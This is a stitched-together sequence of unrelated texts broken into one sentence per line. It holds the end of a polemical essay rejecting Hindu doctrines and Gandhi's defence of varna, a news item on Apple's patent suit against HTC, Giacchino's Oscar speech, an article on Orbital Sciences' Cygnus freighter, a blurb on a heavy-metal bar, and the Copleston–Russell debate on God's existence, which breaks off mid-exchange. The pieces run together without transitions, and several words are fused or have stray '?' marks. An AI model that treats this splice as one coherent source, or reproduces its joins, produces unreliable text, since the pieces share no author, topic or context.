There is no question with me of superiority or inferiority .
It is purely a question of duty .
I have indeed stated that varna is based on birth .
But I have also said that it is possible for a shudra , for instance , to become a vaishya .
But in order to perform the duty of vaishya he does not need the label of a vaishya .
He who performs the duty of a brahman will easily become one in the next incarnation . " [ 84 ]
So , varna - vyavastha , according to Gandhi , is a " healthy division of work based on birth " , which takes into account the " natural tendencies " of human beings and avoids " unworthy competition . "
This apparently plausible defense of varna - vyavastha is , in fact , most unscientific .
It is a well - known and scientifically verified fact that acquired characteristics are not inherited biologically , only genetic qualities are transmitted from one generation to another .
For instance , carpentry is an acquired characteristic ; just as knowledge of philosophy is an acquired quality .
Neither a carpenter 's son or daughter is born with the knowledge of carpentry , nor is a philosopher 's daughter or son born with the knowledge of philosophy .
These are acquired characteristics and , therefore , they cannot be inherited biologically .
If sometimes , though not always , a carpenter 's son becomes a good carpenter or a philosopher 's daughter acquires a good knowledge of philosophy , without being formally initiated into these disciplines , it is not because they are born with the required knowledge , but only because of the favorable environment at home , which enables them to acquire these characteristics .
The result could be different if their places were to be interchanged .
One may say that though the knowledge of carpentry of philosophy in not inherited biologically , the mental qualities enabling one to acquire the requisite knowledge is inherited .
Some physical and mental qualities are , no doubt , inherited but this does not mean that parents and their children are always identical in physical or mental qualities .
It is a well known fact -- anybody can verify this by careful observation -- that due to different permutations and combinations of chromosomes and genes offspring of same parents are not always identical to one another or to their parents .
More often than not , they are different .
For instance , one son or daughter of same parents may be tall and another short .
The colors of skin , hair and eyes may differ likewise .
What is true of physical characteristics is equally true of mental qualities .
Thus , a child may or may not have the mental characteristics , which his father has .
Therefore , it is totally unscientific to forcefully restrict children to the occupations of their forefathers .
It is true that all human beings are not equal in the sense of being identical in physical or mental qualities .
But it does not follow from this that they ought to be denied equal opportunity to join a vocation of their choice or that they ought to be denied equality before law or equal respect as human beings in the society .
As for " unworthy " competition , how do we know that the competition is unworthy unless all are , to begin with , given equal opportunity ?
Take the example of Gandhi himself .
He was a bania by caste .
Yet , in spite of some serious aberrations such as supporting varna - vyavastha based on birth and linking politics with religion , he performed fairly well in the role of a national leader .
It would have been a great loss for the nation if in the name of avoiding " unworthy " competition in politics , Gandhi would have been confined to running a grocery shop .
Similarly , Dr. B.R. Ambedkar was born in an " untouchable " caste , but he played an important role in the drafting of the democratic constitution of independent India .
He also taught in a college for some time .
To use the terminology of varna - vyavastha , he ably performed the work of a Brahmin .
Is it possible to imagine how many Ambedkars we may have lost by now owing to the restrictive varna - vyavastha ?
As we have noted earlier , varna - vyavastha is a closed system of social stratification without any scope for upward social mobility .
To quote M. Haralambos , author of a textbook on sociology , " A person belongs to his parents jati and automatically follows the occupation of the jati into which he was born .
Thus no matter what the biologically based aptitude and capacities of an untouchable , there is no way he can become a Brahmin .
Unless it is assumed that superior genes are permanently located in the Brahmin caste , and there is no evidence that this is the case , then there is probably no relationship between genetically based and socially created inequality in traditional Hindu society . " [ 85 ]
Returning to Gandhi , though Gandhi was opposed to untouchability and caste , he did not carry his opposition to its logical conclusion .
Inconsistently enough , he continued to support the varna - vyavastha based on birth .
At one stage , he even supported restrictions on interdining and intermarriage .
As he wrote in Young India in 1921 , " Hinduism does most emphatically discourage interdining and intermarriage between divisions ...
It is no part of a Hindu 's duty to dine with his son .
And by restricting his choice of bride to a particular group , he exercises rare self - restraint .
Prohibition against intermarriages and interdining is essential for the rapid evolution of the soul . " [ 86 ] ( emphasis mine )
Later Gandhi moved away from these orthodox ideas , and started supporting intercaste marriages .
Finally in 1946 , he refused to solemnize any marriage at Sevagram Ashram unless one of the parties was an untouchable . [ 87 ]
May be he would also have given up varna - vyavastha if he had lived longer .
That , however , is in the realm of imagination , the fact is that Gandhi supported varna - vyavastha .
It is worth noting that he invented his own conception of varna - vyavastha , which , according to him , had nothing to do with the feeling of superiority and inferiority or with prohibition against intermarriage .
We find here in Gandhi a quaint mixture of conservatism and reformism .
I would like to dispose of one last objection before concluding this section .
One may say that the Hindu law at present is quite different from what Manu desired , and presently Hindus in general do not follow Manu in totality .
This is true .
The Hindu law at present , for instance , allows inter-caste marriage and prohibits bigamy and child marriage .
It permits divorce .
It also allows widow remarriage and grants equal rights to daughters in father 's property .
Nevertheless , there seems to be a gap between the progressive Hindu law and the conservative social practices of the Hindus .
A majority of Hindu marriages are still within the caste and very few Hindu women actually claim or get a share in father 's property .
The Indian constitution has rightly made special provisions , such as reservations in services for scheduled castes , scheduled tribes and other socially and educationally backward classes , to enable them to enter occupations and positions of power , which had been traditionally denied to them .
No doubt , some upper caste liberal Hindus , too , support the policy of reservation .
But , by and large , the Hindu upper castes are far from fully reconciled to this progressive step as is evident from violent and aggressive anti-reservation agitation spearheaded by upper caste students from time to time .
This kind of reactionary agitation aimed at preserving the present dominance of upper castes in education and the services enjoys considerable support and sympathy in the upper caste dominated media as well as the academia .
On the whole , the Hindu society is yet to fully exorcise the ghost of Manu .
Caste based on birth and untouchability still exist in the Hindu society , in spite of the fact that untouchability has been abolished by the Indian constitution .
The distribution of education , power and wealth continues to be uneven in the Hindu society , with the dwijas being on the top and the Shudras and untouchables being at the bottom .
Teaching is no more an exclusive preserve of Brahmins , but the occupation of Hindu priests is still fully reserved for Brahmins , though this fact does not arouse the ire of our fervent anti-reservationists .
Moksha , Karmavada and Avatarvada
Moksha is traditionally regarded as the highest end of life in Hindu religion .
The " endless cycle of birth and death " is considered a bondage from which one must attain liberation , that is moksha or mukti .
This whole concept of bondage and liberation is based on the unproved assumption of life after death , and the existence of soul ( atma ) which continues to exist apart from the body even after death .
In the famous words of Gita , the soul changes bodies just as human beings change clothes . [ 88 ]
Now , there are no good reasons for believing in the existence of soul or life after death or rebirth .
These beliefs are not at all supported by incontrovertible scientific evidence .
According to S.N. Dasgupta , " there has seldom been before or after Buddha any serious attempt to prove or disprove the doctrine of rebirth .
The attempts to prove the doctrine of rebirth in the Hindu philosophical works such as Nyaya , etc. are slight and inadequate . " [ 89 ]
However , even before Buddha , Lokayat had disproved the existence of soul , life after death , rebirth , heaven and hell on an empirical basis , as these things are never perceived . [ 90 ]
Thus , in absence of any evidence to the contrary , it is reasonable to believe that each one of us has got one and only one life .
Once a person is dead , he is dead for ever .
Never to be reborn .
Mind , consciousness , memory and life cannot outlast the destruction of brain and body .
This is the harsh truth ; howsoever we may dislike it .
The belief in soul seems to have originated from primitive animism . [ 91 ]
If this belief continues to persist , in spite of total lack of evidence in its support , it is only because of human beings ' inability to come to terms with , or to squarely face , the reality of death .
One likes to believe that one 's near and dear ones , who are dead and finished forever , actually continue to live in some other imaginary world , and that they will also be reborn one day .
One draws comfort from the thought that one will not die even after death , and continue to live in some other form .
It is paradoxical that , first , the fear of death and love of life makes one readily accept the belief in the immortality and rebirth of soul without adequate evidence , and , then , getting rid of this alleged cycle of birth and death itself becomes the topmost religious aim ! [ 92 ]
The problem of getting " released " from the alleged cycle of birth and death is a pseudo - problem ( in the sense that one is trying to get rid of something which simply does not exist ) and moksha is an imaginary ideal which has nothing to do with the reality .
Instead of running after the imaginary ideal of moksha , it is far better to concentrate on improving and living well this one and only life , which we have .
Mimamsa , which is an orthodox
Hindu school of thought , considers attainment of heaven ( swarga ) , instead of moksha , as the highest end of life .
References to heaven and hell are also to be found in the Manusmriti .
The belief in heaven is fairly widespread at popular level .
However , the ideal of the attainment of heaven , too , is based on unproved assumptions , like life after death and the existence of heaven , and , therefore , it can not be accepted .
Another related doctrine is the Hindu belief in karmavada or the so - called law of karma .
According to this doctrine , every human being gets the fruits of his actions either in the present or in some future life .
Whatever a human being is in his present life is the result of his own actions in the past life or lives .
This , again , is a totally unverified and unverifiable doctrine based on the assumption of the " cycle of birth and death " .
It is only a convenient tool for explaining away the perceived inequality in human society .
The idea of karma is found in Buddhism and Jainism as well .
However , these religions do not support varna - vyavastha .
But in Hinduism the doctrine of karma , along with the idea of god , has been used for providing ideological support to the unjust varna - vyavastha and for making it appear just and fair .
In Hinduism the so - called law of karma merely serves the purpose of legitimizing the unjust varna - vyavastha by making the Shudras and the " untouchables " meekly accept their degrading position as a " result of their own deeds " in imaginary past lives , and by assuring them " better " birth in " next life " if they faithfully perform their varna - dharma in their present lives . [ 93 ]
In this way , this doctrine prevents them from revolting against this man-made undemocratic system , which has nothing to do with alleged past and future lives .
Lastly , I come to the Hindu doctrine of avatarvada .
According to this doctrine , whenever religion is threatened in this world , god takes birth as an avatar to put things back into order .
Ram and Krishna , for example , are popularly regarded as avatars by the Hindus .
Belief in avatarvada , too , is logically unjustifiable and merely makes one run away from one 's own responsibilities .
Instead of making efforts to improve their own condition , those who believe in avatarvada keep waiting for an avatar to take birth .
Since god does not exist , there is no question of his being born on this earth as an avatar .
( Let me add here that I also do not believe in the truth of statements like " Jesus is the son of god " or " Mohammed is the messenger of god " . )
Not only I do not regard Ram or Krishna ( or anyone else ) as an avatar of god , I also do not regard them as ideal personalities .
Ram , as mentioned earlier , was on upholder , of the varna - vyavastha .
His cruel behavior with Sita , after fighting a destructive war with Ravana to get her released , is too well known to need recapitulation . [ 94 ]
Krishna , on the other hand , is portrayed in the Mahabharata as the teacher of Bhagvat Gita , a book which expounds untrue and harmful doctrines like the belief in god and immortal soul , avatarvada , karmavada , varnashram dharma and the doctrine of moksha .
In Mahabharata Krishna adopts and advocates adoption of unfair means like lying and deception for achieving one 's ends .
Obviously , he did not believe in the doctrine of purity of ends and means .
There are several flaws in the character of Krishna as portrayed in the Mahabharata , Bhagvat and Harivamsa .
These have been ably enumerated by Dr. Ambedkar in his The Riddle of Ram and Krishna .
I refer the interested reader to this work for a fuller treatment of this subject . [ 95 ]
Conclusion
To conclude , I categorically reject major Hindu religious beliefs including the doctrine of the infallibility of the Vedas , varnashram dharma , moksha , karmavada , and avatarvada .
I am not an admirer of Ram and Krishna , and I also do not believe in idol worship or the Hindu taboo of not eating beef .
I support logical and scientific thinking ; and a secular , rational morality based on human values of liberty , equality and fraternity .
Therefore , I am not a Hindu by conviction , though I am a Hindu by birth .

Google has defended HTC , which manufacturers the search engine 's Nexus One , after Apple accused HTC of infringing 20 of its patents .
" We are not a party to thi s lawsuit .
However , we stand behind our Android operating system and the partners who have helped us to develop it , " Google said .
Apple said the patents cover the iPhone user interface and the smartphone 's underlying architecture and hardware .
" We can sit by and watch competitors steal our patented inventions or we can do something about it , " Apple CEO Steve Jobs said in a statement regarding the lawsuit .
" We think competition is healthy , but competitors should create their own original technology , not steal ours . "
While Apple did not name Google in the lawsuit , it did name HTC handsets that run Google 's Android mobile OS , including the Nexus One , the TouchPro , Touch Diamond and , along with those that feature the Windows Mobile platform .
Apple named this group the ' Accused HTC Android Products ' , and said the collection relied on its technology .
Apple told the US International Trade Organisation ( ITC ) that as many as 10 of the patent violations involve the Nexus One .
Barry Cohen , a patent and intellectual property attorney at Thorp Reed & Armstrong LLP , speculated whether Apple 's lawsuit has a bigger purpose , namely to hit Google .
" Do they have a plan to subsequently [ sue ] Google ?
Possibly , " he told PC Advisor 's sister magazine Computerworld US .
Cohen said that if Tuesday 's filings were only a the first step toward taking on Google directly , he expected that Apple had set its strategy and was following a game plan .
" Apple is a smart company , " he said .
However , Cohen said it was unknown whether Google has an agreement with HTC that would ensure the search - engine helped defend the mobile phone manufacturer against any patent infringement claims that relate to the Android operating system .
" We do n't know what , if any , agreements are in place , " he said .
" If HTC hires a law firm that 's known for working with Google , that would be a hint . "

Michael Giacchino has created some of the best scores in movies ( and TV – Lost ) in recent years .
The scores to both Star Trek and Up were just beautiful .
Last night he won for Best Original Score for his work on Up .
Here ’s the speech … the best one of the night :
“ Thank you , guys .
When I was … I was nine and I asked my dad , “ Can I have your movie camera ?
That old , wind - up 8 millimeter camera that was in your drawer ? ”
And he goes , “ Sure , take it . ”
And I took it and I started making movies with it and I started being as creative as I could , and never once in my life did my parents ever say , “ What you ’re doing is a waste of time . ”
Never .
And I grew up , I had teachers , I had colleagues , I had people that I worked with all through my life who always told me what you ’re doing is not a waste of time .
So that was normal to me that it was OK to do that .
I know there are kids out there that do n’t have that support system so if you ’re out there and you ’re listening , listen to me :
If you want to be creative , get out there and do it .
It ’s not a waste of time .
Do it .
OK ?
Thank you .
Thank you . ”

This graphic shows Orbital Sciences ' Cygnus spacecraft and Taurus 2 rocket , and compares them to NASA 's space shuttles and SpaceX's Falcon 9 rocket .
The field of commercial spaceflight is ripe with youngercompanies hoping to make it big with new spaceships , but Orbital Sciences isdrawing on nearly 30 years of rocket - launching experience for its effort tobuild a new vehicle capable of stocking up the International Space Station .
The Virginia - based company is building the unmanned Cygnusspace freighter and a new rocket , the Taurus 2 , to launch it .
The firstscheduled demonstration and operational launches are slated for 2011 .
" We 're not a small , newly - formed company trying toestablish a track record of mission success , but we 're also notbureaucratically hidebound , " said Barron Beneski , vice president ofcorporate communications for Orbital Sciences .
" I do n't know that you canreally find that combination anywhere else in the industry . "
Founded in 1982 , Orbital Sciences currently employs about3,500 people .
Its flight record includes years of Pegasus rocket launches forcommercial customers , as well as launches of the Minotaur rockets that haveserved U.S. government and military payloads .
" We let the track record of our products speak foritself , " Beneski explained .
Orbital holds a $ 1.9 billion contract with NASA for eightflights to resupply the space station , and is slated to form an integral partof the new U.S. commercial fleet alongside SpaceX 's Falcon9 rocket and Dragon spacecraft , as well as other boosters .
NASA also has a $ 1.6 billion contract with the California - based SpaceX ( short for Space Exploration Technologies ) for unmannedcargo flights to the space station .
SpaceX is preparing to launch its firstFalcon 9 test flight in the next few months .
From cargo to crew
Orbital ?s cylindrical Cygnus freighter includes apressurized cargo module that can carry up to 5,952 pounds ( 2,700 kg ) ofpayload .
Its service module contains avionics , power , communications andcommand and control .
" The service module is being designed to humansafety standards , because it operates in close proximity with the space stationbefore the robotic arm grapple , " Beneski noted .
Orbital also has other prior history with human safetystandards , as a lead contractor which helped create the Orion Launch AbortSystem that would have helped NASA astronauts escape in the event of anemergency involving the now - cancelled Ares I rocket .
" We are probably the industry expert these days inlaunch abort systems through our work on Orion , so that know - how and capabilityresides in Orbital , " Beneski said .
Beneski declined to say that Orbital was aiming forcertain to carry astronauts into orbit .
But he did note that the existingsystems put Orbital in a good position to take advantage of such anopportunity .
" Certainly we have the service module which couldplay a role there , and then the escape system is certainly within Orbital ' scapability , " Beneski said .
" We are ready should NASA go down thatpath . "
Orbital 's recent launch history includes the failedlaunch of its Taurus XL rocket last year , which crashed NASA ?s Orbiting CarbonObservatory into the sea because a payload fairing failed to separate .
But thenew Taurus 2 offers a new slate .
The company is currently working to develop a newMinotaur 4 rocket for the U.S. military .
That rocket is slated for a May 2010test launch from Alaska .
Walking a middle road
Some critics have fretted about untried commerciallaunch vehicles doing much of NASA 's lifting in the near - future .
Last month , President Barack Obama proposed that NASAcancel its Constellation program building the new Orion spacecraft and Aresrockets in line to replace the agency ?s space shuttles .
Instead , the presidentdirected NASA to set aside funding to support the development of commercialspacecraft capable of launching U.S. astronauts into space .
But commercial spaceflight representatives counter thatlarge aerospace companies have provided the vehicles for NASA all along .
" It 's a disservice to focus on the newcomers andleave out the Boeings , Lockheed Martins and General Dynamics that have been inbusiness for 50 years , " said Bretton Alexander , president of the Commercial Spaceflight Federation , during a February teleconference with spaceindustry executives and reporters .
Beneski maintains a tempered optimism about the future ofcommercial spaceflight .
But he clearly stated that commercial firms have muchof the right stuff to keep U.S. spaceflight alive in the 21st century .
" Under the right circumstances , we believe that thecommercial industry ?
with proper government oversight on safety ?
can do this , " Beneski said .
Readying a rocket
Orbital had already begun developing the Taurus 2 rocketbefore it received its NASA contract .
The rocket is designed to not only help deliver cargo tothe space station , but to also launch medium - class satellites into low - Earthorbit and help fill the gap left by the impending retirement of the Delta 2rocket sometime in 2011 .
" Taurus 2 is a perfect fit as the launcher of acargo - carrying spacecraft , which we subsequently developed and named Cygnus , " Beneski told SPACE.com .
The company has begun testing a pathfinder version of theliquid - fuel AJ26 rocket engine that powers the Taurus 2's first stage at NASA ?
sStennis Space Center in Mississippi .
The engine is a commercial version of oneoriginally designed to help Russia 's N - 1 rocket fly cosmonauts to the moonduring the Cold War .
Beneski anticipates seeing a final delivery of Taurus 2 and the Cygnus spacecraft to Wallops Island , Va. later this year , so that therocket and spacecraft systems can be combined .
A new Ukranian Village spot is threatening to remove the bad stigma from prison food .
Lockdown Bar & Grill is n't actually dishing out grub to inmates ( although there were some sketchy customers during our visit ) , but the prison - and zombie - themed heavy metal joint is definitely staking out its spot in the yard .
After watching an Iron Maiden DVD for the millionth time , co-owner PJ Zonis decided to replicate the concert experience in a bar / restaurant , complete with multiple big screens and a powerful audio system .
" I thought ' why not make a bar where you can feel like you 're actually at the show without dealing with the tickets , parking and other hassles with attending a live show , " Zonis said .
The concert schedule is actually posted on the Web site , but requests are considered -- within reason .
A group of gals were watching a " Heart " DVD on a recent visit , but Zonis assures us wo n't see the likes of a Ricky Martin or Britney Spears performing here anytime soon .
The food sticks true to the jailhouse theme , with appetizers like the " Prison Shank , " and burgers such as " Possession of Shrooms " and " Cruelty to Animals . "

A list of all ETHICS COMPLAINTS
A Debate on the Argument from Contingency Father F. C. Copleston and Bertrand Russell
Copleston :
As we are going to discuss the existence of God , it might perhaps be as well to come to some provisional agreement as to what we understand by the term " God . "
I presume that we mean a supreme personal being -- distinct from the world and creator of the world .
Would you agree -- provisionally at least -- to accept this statement as the meaning of the term " God " ?
Russell : Yes , I accept this definition .
Copleston :
Well , my position is the affirmative position that such a being actually exists , and that His existence can be proved philosophically .
Perhaps you would tell me if your position is that of agnosticism or of atheism .
I mean , would you say that the non-existence of God can be proved ?
Russell : No , I should not say that : my position is agnostic .
Copleston : Would you agree with me that the problem of God is a problem of great importance ?
For example , would you agree that if God does not exist , human beings and human history can have no other purpose than the purpose they choose to give themselves , which -- in practice -- is likely to mean the purpose which those impose who have the power to impose it ?
Russell : Roughly speaking , yes , though I should have to place some limitation on your last clause .
Copleston : Would you agree that if there is no God -- no absolute Being -- there can be no absolute values ?
I mean , would you agree that if there is no absolute good that the relativity of values results ?
Russell : No , I think these questions are logically distinct .
Take , for instance , G. E. Moore 's Principia Ethica , where he maintains that there is a distinction of good and evil , that both of these are definite concepts .
But he does not bring in the idea of God to support that contention .
Copleston :
Well , suppose we leave the question of good till later , till we come to the moral argument , and I give first a metaphysical argument .
I 'd like to put the main weight on the metaphysical argument based on Leibniz 's argument from " Contingency " and then later we might discuss the moral argument .
Suppose I give a brief statement on the metaphysical argument and that then we go on to discuss it ?
Russell :
That seems to me to be a very good plan .
The Argument from Contingency
Copleston :
Well , for clarity 's sake , I 'll divide the argument into distinct stages .
First of all , I should say , we know that there are at least some beings in the world which do not contain in themselves the reason for their existence .
For example , I depend on my parents , and now on the air , and on food , and so on .
Now , secondly , the world is simply the real or imagined totality or aggregate of individual objects , none of which contain in themselves alone the reason for their existence .
There is n't any world distinct from the objects which form it , any more than the human race is something apart from the members .
Therefore , I should say , since objects or events exist , and since no object of experience contains within itself reason of its existence , this reason , the totality of objects , must have a reason external to itself .
That reason must be an existent being .
Well , this being is either itself the reason for its own existence , or it is not .
If it is , well and good .
If it is not , then we must proceed farther .
But if we proceed to infinity in that sense , then there 's no explanation of existence at all .
So , I should say , in order to explain existence , we must come to a being which contains within itself the reason for its own existence , that is to say , which can not not exist .
Russell :
This raises a great many points and it is not altogether easy to know where to begin , but I think that , perhaps , in answering your argument , the best point at which to begin is the question of necessary being .
The word " necessary , " I should maintain , can only be applied significantly to propositions .
And , in fact , only to such as are analytic -- that is to say -- such as it is self - contradictory to deny .
I could only admit a necessary being if there were a being whose existence it is self - contradictory to deny .
I should like to know whether you would accept Leibniz 's division of propositions into truths of reason and truths of fact .
The former -- the truths of reason -- being necessary .
Copleston :
Well , I certainly should not subscribe to what seems to be Leibniz 's idea of truths of reason and truths of fact , since it would appear that , for him , there are in the long run only analytic propositions .
It would seem that for Leibniz truths of fact are ultimately reducible to truths of reason .
That is to say , to analytic propositions , at least for an omniscient mind .
Well , I could n't agree with that .
For one thing it would fail to meet the requirements of the experience of freedom .
I do n't want to uphold the whole philosophy of Leibniz .
I have made use of his argument from contingent to necessary being , basing the argument on the principle of sufficient reason , simply because it seems to me a brief and clear formulation of what is , in my opinion , the fundamental metaphysical argument for God 's existence .
Russell : But , to my mind , " a necessary proposition " has got to be analytic .
I do n't see what else it can mean .
And analytic propositions are always complex and logically somewhat late .
" Irrational animals are animals " is an analytic proposition ; but a proposition such as " This is an animal " can never be analytic .
in fact , all the propositions that can be analytic are somewhat late in the build - up of propositions .
Copleston :
Take the proposition " if there is a contingent being then there is a necessary being . "
I consider that that proposition hypothetically expressed is a necessary proposition .
If you are going to call every necessary proposition an analytic proposition , then -- in order to avoid a dispute in terminology -- I would agree to call it analytic , though I do n't consider it a tautological proposition .
But the proposition is a necessary proposition only on the supposition that there is a contingent being .
That there is a contingent being actually existing has to be discovered by experience , and the proposition that there is a contingent being is certainly not an analytic proposition , though once you know , I should maintain , that there is a contingent being , it follows of necessity that there is a necessary being .
Russell :
The difficulty of this argument is that I do n't admit the idea of a necessary being and I do n't admit that there is any particular meaning in calling other beings " contingent . "
These phrases do n't for me have a significance except within a logic that I reject .
Copleston :
Do you mean that you reject these terms because they wo n't fit in with what is called modern logic " ?
Russell :
Well , I can't find anything that they could mean .
The word " necessary , " it seems to me , is a useless word , except as applied to analytic propositions , not to things .
Copleston :
In the first place , what do you mean by " modern logic ? "
As far as I know , there are somewhat differing systems .
In the second place , not all modern logicians surely would admit the meaninglessness of metaphysics .
We both know , at any rate , one very eminent modern thinker whose knowledge of modern logic was profound , but who certainly did not think that metaphysics are meaningless or , in particular , that the problem of God is meaningless .
Again , even if all modern logicians held that metaphysical terms are meaningless , it would not follow that they were right .
The proposition that metaphysical terms are meaningless seems to me to be a proposition based on an assumed philosophy .
The dogmatic position behind it seems to be this :
What will not go into my machine is non-existent , or it is meaningless ; it is the expression of emotion .
I am simply trying to point out that anybody who says that a particular system of modern logic is the sole criterion of meaning is saying something that is over - dogmatic ; he is dogmatically insisting that a part of philosophy is the whole of philosophy .
After all , a " contingent " being is a being which has not in itself the complete reason for its existence that 's what I mean by a contingent being .
You know , as wel I as I do , that the existence of neither of us can be explained without reference to something or somebody outside us , our parents , for example .
A " necessary " being , on the other hand means a being that must and can not not exist .
You may say that there is no such being , but you wil find it hard to convince me that you do not understand the terms I am using .
If you do not understand them , then how can you be entitled to say that such a being does not exist , if that is what you do say ?
Russell :
Well , there are points here that I do n't propose to go into at length .
I do n't maintain the meaninglessness of metaphysics in general at all .
I maintain the meaninglessness of certain particular terms -- not on any general ground , but simply because I 've not been able to see an interpretation of those particular terms .
It 's not a general dogma -- it 's a particular thing .
But those points I will leave out for the moment .
And I will say that what you have been saying brings us back , it seems to me , to the ontological argument that there is a being whose essence involves existence , so that his existence is analytic .
That seems to me to be impossible , and it raises , of course , the question what one means by existence , and as to this , I think a subject named can never be significantly said to exist but only a subject described .
And that existence , in fact , quite definitely is not a predicate .
Copleston :
Well , you say , I believe , that it is bad grammar , or rather bad syntax to say for example " T. S. Eliot exists " ; one ought to say , for example , " He , the author of Murder in the Cathedral , exists . "
Are you going to say that the proposition , " The cause of the world exists , " is without meaning ?
You may say that the world has no cause ; but I fail to see how you can say that the proposition that " the cause of the world exists " is meaningless .
Put it in the form of a question : " Has the world a cause ? " or " Does a cause of the world exist ? "
Most people surely would understand the question , even if they do n't agree about the answer .
Russell : Well , certainly the question " Does the cause of the world exist ? " is a question that has meaning .
But if you say " Yes , God is the cause of the world " you 're using God as a proper name ; then " God exists " will not be a statement that has meaning ; that is the position that I 'm maintaining .
Because , therefore , it will follow that it cannot be an analytic proposition ever to say that this or that exists .
For example , suppose you take as your subject " the existent round - square , " it would look like an analytic proposition that " the existent round - square exists , " but it does n't exist .
Copleston :
No , it does n't , then surely you can't say it does n't exist unless you have a conception of what existence is .
As to the phrase " existent round - square , " I should say that it has no meaning at all .
Russell : I quite agree .
Then I should say the same thing in another context in reference to a " necessary being . "
Copleston :
Well , we seem to have arrived at an impasse .
To say that a necessary being is a being that must exist and cannot not exist has for me a definite meaning .
For you it has no meaning .
Russell : WelI , we can press the point a Iittle , I think .
A being that must exist and cannot not exist , would surely , according to you , be a being whose essence involves existence .
Copleston :
Yes , a being the essence of which is to exist .
But I should not be willing to argue the existence of God simply from the idea of His essence because I do n't think we have any clear intuition of God 's essence as yet .
I think we have to argue from the world of experience to God .
Russell : Yes , I quite see the distinction .
But , at the same time , for a being with sufficient knowledge , it would be true to say " Here is this being whose essence involves existence ! "
Copleston :
Yes , certainly if anybody saw God , he would see that God must exist .
Russell :
So that I mean there is a being whose essence involves existence although we do n't know that essence .
We only know there is such a being .
Copleston :
Yes , I should add we do n't know the essence a priori .
It is only a posteriori through our experience of the world that we come to a knowledge of the existence of that being .
And then one argues , the essence and existence must be identical .
Because if God 's essence and God 's existence was not identical , then some sufficient reason for this existence would have to be found beyond God .
Russell :
So it all turns on this question of sufficient reason , and I must say you have n't defined sufficient reason " in a way that I can understand -- what do you mean by sufficient reason ?
You do n't mean cause ?
Copleston : Not necessarily .
Cause is a kind of sufficient reason .
Only contingent being can have a cause .
God is
His own sufficient reason ; and He is not cause of Himself .
By sufficient reason in the full sense I mean an explanation adequate for the existence of some particular being .
Russell : But when is an explanation adequate ?
Suppose I am about to make a flame with a match .
You may say that the adequate explanation of that is that I rub it on the box .
Copleston :
Well , for practical purposes -- but theoretically , that is only a partial explanation .
An adequate explanation must ultimately be a total explanation , to which nothing further can be added .
Russell :
Then I can only say that you 're looking for something which can't be got , and which one ought not to expect to get .
Copleston :
To say that one has not found it is one thing ; to say that one should not look for it seems to me rather dogmatic .
Russell : Well , I do n't know .
I mean , the explanation of one thing is another thing which makes the other thing dependent on yet another , and you have to grasp this sorry scheme of things entire to do what you want , and that we can't do .
Copleston :
But are you going to say that we can't , or we should n't even raise the question of the existence of the whole of this sorry scheme of things -- of the whole universe ?
Russell : Yes , I do n't think there 's any meaning in it at all .
I think the word " universe " is a handy word in some connections , but I do n't think it stands for anything that has a meaning .
Copleston :
If the word is meaningless , it can't be so very handy .
In any case , I do n't say that the universe is something different from the objects which compose it ( I indicated that in my brief summary of the proof ) , what I 'm doing is to look for the reason , in this case the cause of the objects -- the real or imagined totality of which constitute what we call the universe .
You say , I think that the universe -- or my existence if you prefer , or any other existence -- is unintelligible ?
Russell : First may I take up the point that if a word is meaningless it can't be handy .
That sounds well but is n't in fact correct .
Take , say , such a word as " the " or " than . "
You can't point to any object that those words mean , but they are very useful words ; I should say the same of " universe . "
But leaving that point , you ask whether I consider that the universe is unintelligible .
I should n't say unintelligible -- I think it is without explanation .
Intelligible , to my mind , is a different thing .
Intelligible has to do with the thing itself intrinsically and not with its relations .
Copleston :
Well , my point is that what we call the world is intrinsically unintelligible , apart from the existence of God .
You see , I do n't believe that the infinity of the series of events -- I mean a horizontal series , so to speak -- if such an infinity could be proved , would be in the slightest degree relevant to the situation .
If you add up chocolates you get chocolates after all and not a sheep .
If you add up chocolates to infinity , you presumably get an infinite number of chocolates .
So if you add up contingent beings to infinity , you still get contingent beings , not a necessary being .
An infinite series of contingent beings will be , to my way of thinking , as unable to cause itself as one contingent being .
However , you say , I think , that it is illegitimate to raise the question of what will explain the existence of any particular object ?
Russell :
It 's quite all right if you mean by explaining it , simply finding a cause for it .
Copleston :
Well , why stop at one particular object ?
Why should n't one raise the question of the cause of the existence of all particular objects ?
Russell : Because I see no reason to think there is any .
The whole concept of cause is one we derive from our observation of particular things ; I see no reason whatsoever to suppose that the total has any cause whatsoever .
Copleston :
Well , to say that there is n't any cause is not the same thing as saying that we should n't look for a cause .
The statement that there is n't any cause should come , if it comes at all , at the end of the inquiry , not the beginning .
In any case , if the total has no cause , then to my way of thinking it must be its own cause , which seems to me impossible .
Moreover , the statement that the world is simply there if in answer to a question , presupposes that the question has meaning .
Russell : No , it does n't need to be its own cause , what I 'm saying is that the concept of cause is not applicable to the total .
Copleston :
Then you would agree with Sartre that the universe is what he calls " gratuitous " ?
Russell : Well , the word " gratuitous " suggests that it might be something else ; I should say that the universe is just there , and that 's all .
. Copleston :
Well , I can't see how you can rule out the legitimacy of asking the question how the total , or anything at all comes to be there .
Why something rather than nothing , that is the question ?
The fact that we gain our knowledge of causality empirically , from particular causes , does not rule out the possibility of asking what the cause of the series is .
If the word " cause " were meaningless or if it could be shown that Kant 's view of the matter were correct , the question would be illegitimate I agree ; but you do n't seem to hold that the word " cause " is meaningless , and I do not suppose you are a Kantian .
Russell : I can illustrate what seems to me your fallacy .
Every man who exists has a mother , and it seems to me your argument is that therefore the human race must have a mother , but obviously the human race has n't a mother -- that 's a different logical sphere .
Copleston :
Well , I can't really see any parity .
If I were saying " every object has a phenomenal cause , therefore , the whole series has a phenomenal cause , " there would be a parity ; but I 'm not saying that ; I 'm saying , every object has a phenomenal cause if you insist on the infinity of the series -- but the series of phenomenal causes is an insufficient explanation of the series .
Therefore , the series has not a phenomenal cause but a transcendent cause .
Russell :
That 's always assuming that not only every particular thing in the world , but the world as a whole must have a cause .
For that assumption I see no ground whatever .
If you 'll give me a ground I 'll listen to it .
Copleston :
Well , the series of events is either caused or it's not caused .
If it is caused , there must obviously be a cause outside the series .
If it 's not caused then it 's sufficient to itself , and if it 's sufficient to itself it is what I call necessary .
But it can't be necessary since each member is contingent , and we 've agreed that the total has no reality apart from its members , therefore , it can't be necessary .
Therefore , it can't be ( caused ) -- uncaused -- therefore it must have a cause .
And I should like to observe in passing that the statement " the world is simply there and is inexplicable " can't be got out of logical analysis .
Russell : I do n't want to seem arrogant , but it does seem to me that I can conceive things that you say the human mind can't conceive .
As for things not having a cause , the physicists assure us that individual quantum transitions in atoms have no cause .
Copleston :
Well , I wonder now whether that is n't simply a temporary inference .
Russell :
It may be , but it does show that physicists ' minds can conceive it .
Copleston :
